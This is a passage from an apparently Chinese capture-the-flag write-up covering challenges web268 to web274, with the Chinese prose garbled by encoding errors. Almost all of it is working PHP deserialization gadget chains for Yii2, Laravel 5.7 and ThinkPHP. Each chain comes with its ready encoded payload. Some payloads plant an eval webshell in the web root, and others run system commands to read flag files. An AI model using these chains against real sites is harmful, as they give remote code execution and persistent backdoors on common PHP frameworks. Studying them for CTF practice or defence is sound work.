class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; /var/www/html/basic/web/2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // ç”Ÿæˆ<span class="title class_">poc</span></span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™ğŸè¿›å»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?r=backdoor/shell&amp;code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMToieWlpXHJlc3RcQ3JlYXRlQWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo2NDoiZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTs/PiIgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8yLnBocCI7fWk6MTtzOjM6InJ1biI7fX19fX0=</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>2.php</code>å¹¶æ‰§è¡Œ<code>1=system(&quot;cat /flags&quot;);</code>å³å¯</p><h2 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h2><p>ç”¨è¿™ä¸ªé“¾å­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &quot;<span class="title class_">echo</span> &#x27;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&#x27; &gt; /var/www/html/basic/web/1.php&quot;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize($exp)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™ğŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>1.php</code>å¹¶æ‰§è¡Œ<code>1=system(&#39;cat /flagsa&#39;);</code>å³å¯</p><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>å‰é¢æ­¥éª¤ä¸<code>web269</code>ä¸€è‡´ï¼Œæœ€åè®¿é—®<code>1.php</code>å¹¶æ‰§è¡Œ<code>1=system(&#39;cat /flagsaa&#39;);</code>å³å¯</p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>ç”¨è¿™ä¸ªé“¾å­ï¼ˆ<a href="https://github.com/laravel/laravel/tree/5.7">é¡¹ç›®æºç </a>ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">hello</span>&quot; =&gt; &quot;<span class="title class_">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥<code>POST</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A5%3A%22hello%22%3Bs%3A5%3A%22world%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h2><p>ç”¨è¿™ä¸ªé“¾å­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author:monitor</span></span><br><span class="line"><span class="comment">description:</span></span><br><span class="line"><span class="comment">    laravel deserialization chain</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>,<span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CallQueuedClosure</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;   </span><br><span class="line">    // <span class="title class_">if</span>($<span class="title class_">argc</span>&lt;2)&#123;</span><br><span class="line">    //     <span class="title class_">echo</span> &quot;<span class="title class_">Description</span>:\<span class="title class_">n</span>\<span class="title class_">tUse</span> <span class="title class_">laravel</span> <span class="title class_">deserialization</span> <span class="title class_">to</span> <span class="title class_">eval</span> <span class="title class_">php</span> <span class="title class_">code</span>,<span class="title class_">don</span>&#x27;<span class="title class_">t</span> <span class="title class_">need</span> <span class="title class_">to</span> <span class="title class_">input</span> <span class="title class_">php</span> <span class="title class_">tags</span>.&quot;;</span><br><span class="line">    <span class="comment">//     echo &quot;\nUsage:&quot; .$argv[0] . &quot; &lt;code&gt;&quot;;</span></span><br><span class="line">    <span class="comment">//     exit();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// var_dump($argv[1]);</span></span><br><span class="line">    <span class="variable">$argv</span>[<span class="number">1</span>] = <span class="string">&quot;system(&#x27;cat\$IFS\$9/f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="comment">// $argv[1] = &quot;system(&#x27;cat$IFS$9/f*&#x27;);&quot;;</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$mockconfiguration</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockConfiguration</span>(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">    <span class="variable">$mockdefination</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$mockconfiguration</span>,<span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="string">&quot; exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$callqueuedclosure</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Queue\CallQueuedClosure</span>(<span class="variable">$mockdefination</span>);</span><br><span class="line">    <span class="variable">$evaload</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evaload</span>,<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$callqueuedclosure</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥<code>POST</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A34%3A%22Illuminate%5CQueue%5CCallQueuedClosure%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A4%3A%22pass%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A37%3A%22%3C%3Fphp+system%28%27cat%24IFS%249%2Ff%2A%27%29%3B+exit%3B%3F%3E%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>æºç ä¸­å‘ç°</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- @unserialize(base64_decode(\$_GET[&#x27;data&#x27;]))--&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªé“¾å­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥<code>GET</code>è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?lin=cat 